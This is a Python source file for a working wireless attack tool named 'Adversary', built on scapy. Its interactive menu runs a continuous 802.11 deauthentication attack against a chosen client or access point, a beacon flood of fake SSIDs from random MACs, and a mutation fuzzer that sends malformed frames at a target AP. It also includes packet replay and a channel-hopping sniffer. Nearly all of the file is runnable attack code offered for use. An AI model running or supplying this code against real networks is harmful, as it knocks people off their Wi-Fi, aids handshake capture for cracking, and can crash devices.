#!/usr/bin/env python3
print("Loading")
import readline
import time
import pyfiglet
from scapy.all import *
from scapy.interfaces import IFACES # Importing * doesn't import this for some reason
import random
import string
import os
import sys
import subprocess #okay i hate calling to the system, but trying pyroute2 for changing frequencies is just too hard
# so i will just call iw for channel hopping
if os.name == 'nt':
    print("Running Windows, goodbye.")
    sys.exit(1)
def hop_channel(interface_name):
    hop_channel = random.randint(1, 11)
    try:
        # call iw
        subprocess.run(["iw", "dev", interface_name, "set", "channel", str(hop_channel)],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return hop_channel
    except Exception:
        # fallback to iwconfig
        try:
            subprocess.run(["iwconfig", interface_name, "channel", str(hop_channel)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            return hop_channel
        except Exception:
            return None

def is_valid_interface(interface):
    # check if it even exists in the fsystem
    if not os.path.exists(f"/sys/class/net/{interface}"):
        print(f"{RED}Error: Interface '{interface}' does not exist.{RESET}")
        return False

    # check if the thing is in monitor mode
    mode_path = f"/sys/class/net/{interface}/type"
    try:
        with open(mode_path, "r") as f:
            iface_type = f.read().strip()
            if iface_type in ["802", "803"]:
                return True

        print(f"{RED}Error: Interface '{interface}' is not in MONITOR mode.{RESET}")
        return False

    except Exception:
        # to not be discriminatory for weird distros where it doesn't behave like this, i'll assume it's valid
        return True

def generate_random_mac():
    # generates a 'valid' random MAC. previously, it was built into the elifs and only used numbers to generate macs.
    return f"00:{random.randint(0x10, 0xef):02x}:{random.randint(0x10, 0xef):02x}:{random.randint(0x10, 0xef):02x}:{random.randint(0x10, 0xef):02x}:{random.randint(0x10, 0xef):02x}"

def mutate_wifi_packet(base_pkt, mutation_rate=0.15):
# very unreadable, and i am sorry for that
    pkt_bytes = bytearray(raw(base_pkt))

    # track where radiotap ends as to not break driver functions
    start_idx = len(base_pkt[RadioTap]) if base_pkt.haslayer(RadioTap) else 0
    if start_idx >= len(pkt_bytes):
        start_idx = 0

    num_mutations = max(1, int((len(pkt_bytes) - start_idx) * mutation_rate))

    for _ in range(num_mutations):
        idx = random.randint(start_idx, len(pkt_bytes) - 1)
        mutation_type = random.choice(['flip_bit', 'random_byte', 'zero_out'])

        if mutation_type == 'flip_bit':
            pkt_bytes[idx] ^= (1 << random.randint(0, 7))
        elif mutation_type == 'random_byte':
            pkt_bytes[idx] = random.randint(0, 255)
        elif mutation_type == 'zero_out':
            pkt_bytes[idx] = 0x00

    return RadioTap() / Raw(bytes(pkt_bytes[start_idx:]))
def clear():
    # don't like calling the system with subprocess.run()
    # so i shall use this
    sys.stdout.write("\033[H\033[2J")
    sys.stdout.flush()

if os.geteuid() != 0:
    raise PermissionError("Adversary must be run as root")
    sys.exit(1)
clear()
banner_flavor = random.randint(1, 6)
#colors
RESET = "[0m"
BOLD = "[1m"
BLACK = "[30m"
RED = "[31m"
GREEN = "[32m"
YELLOW = "[33m"
BLUE = "[34m"
MAGENTA = "[35m"
CYAN = "[36m"
WHITE = "[37m"
print(f"{GREEN}Loaded{RESET}")
boring_banner = pyfiglet.figlet_format("ADVERSARY", font="slant")
cool_banner = f"{RED}{boring_banner}{RESET}"
print(cool_banner)
print("help/? for commands")
if banner_flavor == 1:
    print("Why use bettercap?")
elif banner_flavor == 2:
    print("We all hate cryptography")
elif banner_flavor == 3:
    print("Who has actually exploited Dragonblood?")
elif banner_flavor == 4:
    print("WEeeeeee woOOOOOOOOOOOOO WEEEEEEEEEEEEEEWOoooooooooooooo HE RAN CMATRIX!")
elif banner_flavor == 5:
    print("Who uses zsh? Just use bash with ble.sh or something")
elif banner_flavor == 6:
    print("This will be replaced when GTA 6 comes (No dev builds do not count)")
# callback function for the sniffer. Absolute spaghetti
def wifi_sniff_callback(pkt):
    if pkt.haslayer(Dot11):
        # management frames
        if pkt.type == 0:
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else "Hidden"
                print(f"[{GREEN}BEACON{RESET}] BSSID: {pkt.addr3} | SSID: {ssid}")
            elif pkt.haslayer(Dot11Deauth):
                print(f"[{RED}DEAUTH{RESET}] From: {pkt.addr2} -> To: {pkt.addr1} | Reason: {pkt[Dot11Deauth].reason}")
            elif pkt.subtype == 4: # Probe Request
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else "Broadcast"
                print(f"[{CYAN}PROBE REQ{RESET}] Client: {pkt.addr2} searching for: {ssid}")
        # data frames
        elif pkt.type == 2:
            print(f"[{YELLOW}DATA{RESET}] {pkt.addr2} -> {pkt.addr1}")

def main_loop():
  while True:
      cmd = str(input(f"{RED}Adversary >{RESET} ")).strip()
      if cmd in ['?', 'help']:
          print('''
          disconnect   -> Runs a Denial Of Service Suite with reason 7
          disconnect-b -> Runs a Beacon Flood Suite (spamming SSID beacons into the air)
          sniff        -> Runs a packet sniffer, allows filtering.
          fuzz -> Runs a Mutation Fuzzing suite (Codename: The Banshee)
          replay -> Runs a Packet Replay suite
          clear        -> Clears the screen.
          exit/quit/leave -> Exits cleanly without a traceback (as you would get with ctrl c)
          help/? -> Show this menu''')
      elif cmd in ['exit', 'quit', 'leave']:
          exitmsg = random.randint(1, 5)
          if exitmsg == 1:
              print("Thank you for shopping with Adversary (yes, a SEToolkit reference)")
              sys.exit()
          elif exitmsg == 2:
              print("GATEWAY has inhibited status effect PTSD")
              sys.exit()
          elif exitmsg == 3:
              print("I think you should give your wireless card a rest.")
              sys.exit()
          elif exitmsg == 4:
              print("The GATEWAY is never going to forgive you.")
              sys.exit()
          elif exitmsg == 5:
              print("Bettercap's prompt looks worse than a bright mode Wireshark graph (no hate to you bettercap)")
              sys.exit()
      elif cmd == 'replay':
          # i did heavily overcomplicate this
          # but it is necessary to make it function quickly
          # even with massive pcaps and low RAM
          print("Packet Replay suite, Theater Kid--Codename: The Mimic")
          print("Note that The Mimic is in beta.")
          print("Answer the following questions correctly.")
          pcap = input("Give the path to the pcap, preferably pcapng. \n < ")
          interface = input("Interface? BE IN MONITOR! \n < ")
          if not is_valid_interface(interface):
              continue
          if not os.path.exists(pcap):
              print("That doesn't exist")
              continue
          print("The play begins")
          sent_count = 0
          reader = PcapNgReader if pcap.endswith('.pcapng') else PcapReader # just use pcapng bro its so much better
          try:
              with reader(pcap) as packet_stream:
                  for packet in packet_stream:
                      send(packet, iface=interface, verbose=False)
                      sent_count += 1
                      if sent_count == 500:
                          print("That is a lot of packets.")
                      elif sent_count == 1000:
                          print("Your wireless card is...athletic")
                      elif sent_count == 2000:
                          print("Give your card a break")
                      elif sent_count == 10000:
                          print("jesus christ that is a massive pcap. Pressing f for your wireless card and AP")
                      if packet.haslayer('TCP') and packet.getlayer('TCP').dport == 21:
                          print(f"[DEBUG] Found FTP Packet destined for port 21!")

          except KeyboardInterrupt:
              print(f"interrupt, the show must not go on")
          except Exception as e:
              print(f"\nerror during replay: {e}")
          finally:
              print(f"ended, sent {sent_count} packets")
      elif cmd == 'sniff':
          print("Passive Sniffing suite, Nosey Mailman--Codename: The Overseer")
          print("This doesn't require monitor mode, but it is recommended")
          print("Answer the following questions correctly.")
          interface = input("Interface? \n < ").strip()
          pkt_filter = input("BPF Filter? press enter for all packets, or for example 'type mgt') \n < ").strip()
          channel = input("What channel to sniff on? Type HOP for hopping \n < ").strip()
          ynpcapng = input("Write packets to pcapng file? Y/N \n < ").strip().lower()
          writer = None # to keep pyflakes3 happy
          if ynpcapng == 'y':
              filename = input("What file to write to? \n < ")
              if filename == '':
                  print("Saving to default file, adversary_overseer.pcapng")
                  filename = "adversary_overseer.pcapng"
              if not filename.endswith(".pcapng"):
                  print(f"Saving to file {filename}.pcapng (added pcapng for you)")
              else:
                  print(f"Saving to file {filename}")
              writer = PcapNgWriter(filename)
          print("The reading begins")
          print(f"Sniffing on {interface}... Press CTRL + C to stop.")

          # allows hopping mid sniff
          # since sniff blocks the main thread, i shall use a custom prn handler that can hop channels
          start_time = [time.time()]
          current_ch = [6]

          def automated_sniff_cb(pkt):
              if channel.upper() == 'HOP':
                  if time.time() - start_time[0] > 1.0: # jump once a second
                      hopped = hop_channel(interface)
                      if hopped:
                          current_ch[0] = hopped
                      start_time[0] = time.time()
              if writer:
                  writer.write(pkt)
              wifi_sniff_callback(pkt)

          try:
              # store=False saves us on low end hardware
              sniff(iface=interface, filter=pkt_filter if pkt_filter else None, prn=automated_sniff_cb, store=False)
          except KeyboardInterrupt:
              print("\nending sniff.")
          except Exception as e:
              print(f"\n{RED}Error during sniffing: {e}{RESET}")
          finally:
              print(f"Your nice little pcapng is written. {filename} ")
              if writer:
                  writer.close()
      elif cmd == 'clear':
          clear()

      elif cmd == 'disconnect':
             print("Deauthing suite, Hacker's Living Weapon--Codename: The Evictor")
             print("Answer the following questions correctly.")
             client_mac = input("Client MAC? FF:FF:FF:FF:FF:FF for targeting whole AP. \n < ").strip().lower()
             ap_mac = input("AP MAC? \n < ").strip().lower()
             interface = input("Interface (BE IN MONITOR!) \n < ").strip()
             verbose = input("Verbose? Y/N \n < ").strip().lower()
             channel = input("What channel to deauth on? Type HOP for hopping \n < ").strip()

             if not is_valid_interface(interface):
                  continue

             print("Deauthing, run airodump-ng or something for handshakes. CTRL + C to stop.")
             try:
               packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)

              # a manual python loop makes sure that the verbose thing is reached

               while True:
                  if channel.upper() == 'HOP':
                      hop_channel(interface)
                  sendp(packet, iface=interface, count=1, verbose=False)
                  if verbose == 'y':
                      print(f"Sent deauth to client: {client_mac}, AP: {ap_mac}, on interface {interface}")
                  time.sleep(0.1) # for our own good

             except KeyboardInterrupt:
              print("\nending deauth.")

      elif cmd == 'disconnect-b':
          print("Beacon Flooding suite, Godspeed to battery life--Codename: The Illusionist")
          print("Answer the following questions correctly.")
          fake_name = input("What is the name you wanna spam? Type FUZZIT for randomly generated. \n < ").strip()
          interface = input("Interface? (BE IN MONITOR!) \n < ").strip()
          verbose = input("Verbose? Beware that your screen will be SPAMMED. Y/N \n < ").strip().lower()
          channel = input("What channel to broadcast to? Type HOP for hopping \n < ").strip()
          if not is_valid_interface(interface):
              continue
          try:
              if fake_name == 'FUZZIT':
                  print("Fuzzing names. Press CTRL + C to end")
                  alphabet = list(string.ascii_letters)
                  current_channel = 6

                  try:
                      s = conf.L2socket(iface=interface)
                  except Exception:
                      s = None

                  while True:
                      if channel.upper() == 'HOP':
                          hopped = hop_channel(interface)
                          if hopped:
                              current_channel = hopped
                              if verbose == 'y':
                                  print(f"[{CYAN}HOPPER{RESET}] Tuned interface to channel {current_channel}", flush=True)

                      length_iter = random.randint(4, 32)
                      ssid_random = "".join(random.choices(alphabet, k=length_iter))
                      if verbose == 'y':
                          print(f"SSID sent out: {ssid_random} ", flush=True)
                      fake_mac = generate_random_mac()
                      dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=fake_mac, addr3=fake_mac)
                      beacon = Dot11Beacon(cap="ESS")

                      ssid = Dot11Elt(ID="SSID", info=ssid_random)
                      rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")
                      channel_elt = Dot11Elt(ID="DSset", info=bytes([current_channel]))

                      packet = RadioTap() / dot11 / beacon / ssid / rates / channel_elt

                      try:
                          if s:
                              s.send(packet)
                          else:
                              sendp(packet, iface=interface, verbose=False)
                      except Exception:
                          try:
                              s = conf.L2socket(iface=interface)
                          except Exception:
                              s = None

                      time.sleep(0.01)
              else:
                  print(f"Spamming. name: {fake_name}. Press CTRL + C to end")
                  current_channel = 6

                  try:
                      s = conf.L2socket(iface=interface)
                  except Exception:
                      s = None

                  while True:
                      if channel.upper() == 'HOP':
                          hopped = hop_channel(interface)
                          if hopped:
                              current_channel = hopped
                              if verbose == 'y':
                                  print(f"[{CYAN}HOPPER{RESET}] Tuned interface to channel {current_channel}", flush=True)
                      if verbose == 'y':
                          print(f"SSID sent out: {fake_name} ", flush=True)
                      fake_mac = generate_random_mac()
                      dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=fake_mac, addr3=fake_mac)
                      beacon = Dot11Beacon(cap="ESS")
                      essid = Dot11Elt(ID="SSID", info=fake_name)
                      rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")
                      channel_elt = Dot11Elt(ID="DSset", info=bytes([current_channel]))

                      packet = RadioTap() / dot11 / beacon / essid / rates / channel_elt

                      try:
                          if s:
                              s.send(packet)
                          else:
                              sendp(packet, iface=interface, verbose=False)
                      except Exception:
                          try:
                              s = conf.L2socket(iface=interface)
                          except Exception:
                              s = None

                      time.sleep(0.01)
          except KeyboardInterrupt:
              print("\nending spam.")

      elif cmd == 'fuzz':
          print("Mutation Fuzzing suite, Chain-Fire--Codename: The Banshee")
          print("Answer the following questions correctly.")
          target_mac = input("Target AP MAC? \n < ").strip().lower()
          interface = input("Interface? (BE IN MONITOR!) \n < ").strip()
          verbose = input("Verbose? Y/N \n < ").strip().lower()
          channel = input("What channel to fuzz on? Type HOP for hopping \n < ").strip()
          if not is_valid_interface(interface):
              continue

          print(f"Generating and corrupting frames against {target_mac}. Press CTRL + C to stop.")
          try:
              count = 0
              current_channel = 6
              while True:
                  if channel.upper() == 'HOP':
                      hopped = hop_channel(interface)
                      if hopped:
                          current_channel = hopped

                  fuzz_type = random.choice(['beacon', 'probe', 'deauth'])
                  src_mac = generate_random_mac()

                  if fuzz_type == 'beacon':
                      dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3=src_mac)
                      base = dot11 / Dot11Beacon(cap="ESS") / Dot11Elt(ID="SSID", info="FUZZ_TARGET") / Dot11Elt(ID="DSset", info=bytes([current_channel]))
                  elif fuzz_type == 'probe':
                      dot11 = Dot11(type=0, subtype=4, addr1=target_mac, addr2=src_mac, addr3=target_mac)
                      base = dot11 / Dot11ProbeReq() / Dot11Elt(ID="SSID", info="FUZZ_TARGET")
                  else:
                      base = Dot11(type=0, subtype=12, addr1=target_mac, addr2=src_mac, addr3=target_mac) / Dot11Deauth(reason=7)

                  fuzzed_pkt = mutate_wifi_packet(base, mutation_rate=0.15)
                  send(fuzzed_pkt, iface=interface, verbose=False)

                  count += 1
                  if verbose == 'y':

                   if count % 25 == 0:
                       print(f"[{MAGENTA}FUZZER{RESET}] Injected {count} mutated malformed layers into the air...")
                  time.sleep(0.02)
          except KeyboardInterrupt:
              print(f"\nending fuzzing. Total sent: {count}")

      else:
          print("command doesn't exist, ? for help")
main_loop()
